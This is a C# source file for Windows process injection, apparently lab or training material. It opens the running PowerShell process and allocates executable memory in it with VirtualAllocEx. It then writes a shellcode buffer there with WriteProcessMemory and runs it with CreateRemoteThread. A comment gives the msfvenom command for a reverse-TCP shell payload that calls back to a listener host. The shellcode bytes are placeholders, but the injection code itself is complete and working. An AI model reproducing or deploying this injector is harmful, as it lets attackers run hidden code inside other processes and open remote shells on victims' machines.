using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        static void Main(string[] args)
        {
            IntPtr hProcess = default;
            Process[] powershellPid = Process.GetProcessesByName("powershell");
            int processID = 0;
            foreach (Process process in powershellPid)
            {
                //Open remote process
                processID = process.Id;
                hProcess = OpenProcess(0x001F0FFF, false, process.Id);
            }
           
            //Allocate space
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            
            string allocAddress = string.Format("{0:X}", addr); // Pointer -> String
            int number = int.Parse(allocAddress); // String -> Int
            string allocAddressHex = number.ToString("x"); // Int -> Hex
            Console.WriteLine("Executable Memory Address (VirtualAllocEx) to remote processID-> "+processID+" on Mem.Address ->" + "0x"+allocAddressHex);
            

            // x86 Payload: msfvenom -p windows/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            byte[] buf = new byte[<BYTES>] { <SHELLCODE> };

            unsafe
            {
                fixed (byte* p = &buf[0])
                {
                    byte* p2 = p;
                    // https://stackoverflow.com/questions/2057469/how-can-i-display-a-pointer-address-in-c
                    //string bufAddress = string.Format("0x{0:X}", new IntPtr(p2));
                    
                    //Convert DEC->HEX
                    string bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
                    int bufInt = int.Parse(bufString); //String -> Integer
                    string bufHex = bufInt.ToString("x"); //Integer -> Hex

                    Console.WriteLine("Payload Address on this executable: "+"0x"+bufHex);

                }
            }
            Console.ReadLine();
            IntPtr outSize;
            
            //Write to remote process
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            Console.WriteLine("Payload has been written to the buffer!");
            Console.ReadLine();

            //Enumerate the threads of the remote process before creating a new one.
            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            //Create a remote thread and execute it
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            //Enumerate threads from the given process.
            ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
            foreach(ProcessThread thread in threads)
            {
                if (!threadList.Contains(thread.Id))
                {
                    Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                }
                
            }
        }
    }
}
